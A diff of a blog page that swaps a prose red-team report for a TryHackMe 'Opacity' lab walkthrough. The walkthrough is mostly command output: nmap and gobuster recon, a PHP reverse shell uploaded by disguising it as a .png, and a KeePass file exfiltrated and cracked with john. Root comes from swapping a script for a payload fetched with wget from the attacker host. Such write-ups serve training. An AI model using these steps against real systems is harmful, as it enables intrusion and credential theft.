@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FinTech Red Team Engagement | Technical Intelligence Labs</title>
+    <title>Opacity | Technical Intelligence Labs</title>
     <link rel="stylesheet" href="../css/custom.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -106,53 +106,158 @@
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
-                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">ethical-hacking</span>
-                <span>// 2025-12-30</span>
-                <span>// ID: REF-FinTech Red Team Engagement</span>
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Opacity</span>
             </div>
             
-            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">FinTech Red Team Engagement</h1>
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Opacity</h1>
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- ['red teaming', 'fintech security', 'APT simulation', 'spear-phishing', 'lateral movement', 'domain compromise', 'cobalt strike', 'ethical hacking'] -->
+                <!-- tryhackme -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<h1>FinTech Red Team Engagement Report</h1>
-<h2>Introduction</h2>
-<p>This report details a full-scope Red Team operation conducted against a prominent digital bank. The engagement was designed to simulate the tactics, techniques, and procedures (TTPs) of an Advanced Persistent Threat (APT) group, with the primary objective of assessing the organization's resilience against sophisticated cyberattacks. The operation aimed to achieve domain compromise, evaluating the security controls, detection capabilities, and incident response processes of the target environment. The project also served as a practical exploration of advanced ethical hacking methodologies.</p>
-<h2>Reconnaissance</h2>
-<p>Initial intelligence gathering focused on open-source information (OSINT) to identify key personnel, organizational structures, and potential technological footprints relevant to the target digital bank. This phase aimed to build a comprehensive profile of the target environment, identifying potential entry points and suitable candidates for social engineering attacks. Specific attention was paid to identifying email address formats and publicly available employee information to craft credible spear-phishing lures.</p>
-<h2>Enumeration</h2>
-<p>Following the reconnaissance phase, targeted enumeration was conducted to further refine potential attack vectors. This involved analyzing identified employee profiles and external-facing infrastructure for any vulnerabilities or misconfigurations that could facilitate initial access. The data collected was critical for tailoring subsequent exploitation attempts, particularly for crafting highly personalized and convincing spear-phishing emails.</p>
-<h2>Exploitation</h2>
-<p>The primary method for gaining initial access was a meticulously planned spear-phishing campaign. Tailored emails, designed to bypass existing email security controls and exploit human factors, were sent to identified targets within the organization.</p>
-<h3>Initial Access &amp; Command and Control (C2) Establishment</h3>
-<p>Upon successful execution of a malicious payload by a target, initial access was gained on a user workstation. A sophisticated command and control (C2) channel was established utilizing <strong>Cobalt Strike</strong>. Cobalt Strike's beacon functionality provided a robust and covert communication pathway for subsequent post-exploitation activities, allowing for remote code execution, file transfers, and system information gathering without raising immediate suspicion.</p>
-<h2>Privilege Escalation &amp; Lateral Movement</h2>
-<p>With initial access established, the focus shifted to escalating privileges on the compromised host and then moving laterally within the network to reach high-value assets, specifically the domain controllers.</p>
-<h3>Local Privilege Escalation</h3>
-<p>Techniques were employed to escalate privileges on the initial foothold, moving from a standard user context to administrative or system-level access. This critical step enabled broader access to local resources and the ability to extract credentials or execute privileged operations necessary for lateral movement.</p>
-<h3>Lateral Movement</h3>
-<p>Leveraging the elevated privileges and collected credentials, various lateral movement techniques were executed to navigate deeper into the target's internal network. This involved:<br />
-*   <strong>Pass-the-Hash/Ticket</strong>: Reusing compromised NTLM hashes or Kerberos tickets to authenticate to other systems.<br />
-*   <strong>Service Creation/Modification</strong>: Installing or modifying services on remote machines to execute code.<br />
-*   <strong>Remote Code Execution (WMI/PsExec)</strong>: Utilizing administrative tools to execute commands remotely.</p>
-<p>Through a systematic approach, the Red Team mapped critical network segments and identified pathways leading to the domain controllers.</p>
-<h3>Domain Controller Compromise</h3>
-<p>The culmination of the lateral movement phase was the successful compromise of the organization's domain controllers. This provided full control over the Active Directory environment, signifying a complete breach of the target's core identity management system. The compromise demonstrated the potential for an APT to establish persistent access and exert extensive control over the entire enterprise network.</p>
-<h2>Conclusion</h2>
-<p>This Red Team engagement successfully demonstrated the ability of a simulated APT group to compromise the domain controllers of a digital bank. The operation highlighted critical vulnerabilities in the organization's security posture, specifically regarding its susceptibility to spear-phishing attacks and the effectiveness of its internal network segmentation and detection capabilities.</p>
-<p>Key achievements include:<br />
-*   Successful initial access via a sophisticated spear-phishing campaign.<br />
-*   Effective deployment and utilization of <strong>Cobalt Strike</strong> for C2 operations and post-exploitation.<br />
-*   Demonstrated expertise in complex <strong>Red Teaming</strong> methodologies, including privilege escalation and advanced lateral movement techniques.<br />
-*   Validation of an attack path leading to full domain compromise, mimicking real-world APT TTPs.</p>
-<p>The detailed findings of this engagement have been thoroughly documented in a comprehensive technical report, providing actionable recommendations for strengthening the digital bank's security defenses against advanced persistent threats.</p>
+<pre class="codehilite"><code>PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 5c:c3:d4:23:0b:5e:bf:4a:d4:41:f6:6a:76:09:78:34 (RSA)
+|   256 86:b0:f9:e7:6b:2e:13:8a:37:7c:9a:91:de:b6:c7:a3 (ECDSA)
+|_  256 40:54:19:e8:d6:05:1b:ed:ec:16:9d:e4:e6:91:63:fa (ED25519)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-title: Login
+|_Requested resource was login.php
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 4
+445/tcp open  netbios-ssn Samba smbd 4
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: IP-10-67-190-79, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb2-time: 
+|   date: 2026-01-01T09:13:14
+|_  start_date: N/A
+|_clock-skew: 6s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+</code></pre>
+
+<pre class="codehilite"><code>└─$ gobuster dir -u http://10.67.190.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+/css                  (Status: 301) [Size: 310] [--&gt; http://10.67.190.79/css/]
+/cloud                (Status: 301) [Size: 312] [--&gt; http://10.67.190.79/cloud/]
+</code></pre>
+
+<p>I upload reverse shell into <code>cloud</code> dir </p>
+<pre class="codehilite"><code>└─$ python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.67.190.79 - - [01/Jan/2026 04:26:32] &quot;GET /shell.php HTTP/1.1&quot; 200 -
+
+http://10.67.190.79/cloud/images/shell.php#.png (in cloud upload)
+
+└─$ nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [192.168.153.193] from (UNKNOWN) [10.67.190.79] 49872
+Linux ip-10-67-190-79 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 09:26:53 up 19 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+www-data@ip-10-67-190-79:/$ export TERM=xterm
+export TERM=xterm
+www-data@ip-10-67-190-79:/$ ^Z
+zsh: suspended  nc -lnvp 9001
+
+stty raw -echo; fg
+stty rows 38 columns 116
+[1]  + continued  nc -lnvp 9001
+
+www-data@ip-10-67-190-79:/$ 
+</code></pre>
+
+<pre class="codehilite"><code>www-data@ip-10-67-190-79:/opt$ ls
+dataset.kdbx
+www-data@ip-10-67-190-79:/opt$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.153.193 - - [01/Jan/2026 09:32:26] &quot;GET /dataset.kdbx HTTP/1.1&quot; 200 -
+^C
+
+┌──(kali㉿kali)-[~/tryhackme/opacity]
+└─$ keepass2john dataset.kdbx &gt; keepasshash.txt
+
+
+└─$ john keepasshash.txt --wordlist=/usr/share/wordlists/rockyou.txt          
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 100000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+741852963        (dataset)     
+1g 0:00:00:14 DONE (2026-01-01 04:33) 0.06756g/s 59.45p/s 59.45c/s 59.45C/s felipe..gorgeous
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+
+<p>after crack need to use <code>keepass2</code> tool to open dataset find pwd and get real credintial</p>
+<pre class="codehilite"><code>sysadmin@ip-10-67-190-79:~$ ls
+local.txt  scripts
+</code></pre>
+
+<p>root</p>
+<pre class="codehilite"><code>sysadmin@ip-10-67-190-79:~/scripts/lib$ rm -rf backup.inc.php
+sysadmin@ip-10-67-190-79:~/scripts/lib$ ls
+application.php  biopax2bio2rdf.php  dataset.php  owlapi.php  rdfapi.php    utils.php
+bio2rdfapi.php   dataresource.php    fileapi.php  phplib.php  registry.php  xmlapi.php
+sysadmin@ip-10-67-190-79:~/scripts/lib$ wget http://192.168.153.193:8000/backup.inc.php
+--2026-01-01 10:17:47--  http://192.168.153.193:8000/backup.inc.php
+Connecting to 192.168.153.193:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2479 (2.4K) [application/octet-stream]
+Saving to: ‘backup.inc.php’
+
+backup.inc.php                         100%[==========================================================================&gt;]   2.42K  2.85KB/s    in 0.9s    
+
+2026-01-01 10:17:49 (2.85 KB/s) - ‘backup.inc.php’ saved [2479/2479]
+
+sysadmin@ip-10-67-190-79:~/scripts/lib$ ls
+application.php  bio2rdfapi.php      dataresource.php  fileapi.php  phplib.php  registry.php  xmlapi.php
+backup.inc.php   biopax2bio2rdf.php  dataset.php       owlapi.php   rdfapi.php  utils.php
+sysadmin@ip-10-67-190-79:~/scripts/lib$ chmod +x backup.inc.php
+sysadmin@ip-10-67-190-79:~/scripts/lib$ ./backup.inc.php
+</code></pre>
+
+<pre class="codehilite"><code>└─$ nc -lnvp 7777
+listening on [any] 7777 ...
+connect to [192.168.153.193] from (UNKNOWN) [10.67.190.79] 36262
+Linux ip-10-67-190-79 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 10:19:02 up  1:11,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+sysadmin pts/1    192.168.153.193  10:01   13.00s  0.04s  0.04s -bash
+uid=0(root) gid=0(root) groups=0(root)
+/bin/sh: 0: can't access tty; job control turned off
+# cd root
+# ls
+proof.txt
+snap
+# cat proof.txt
+</code></pre>
         </div>
     </main>
 
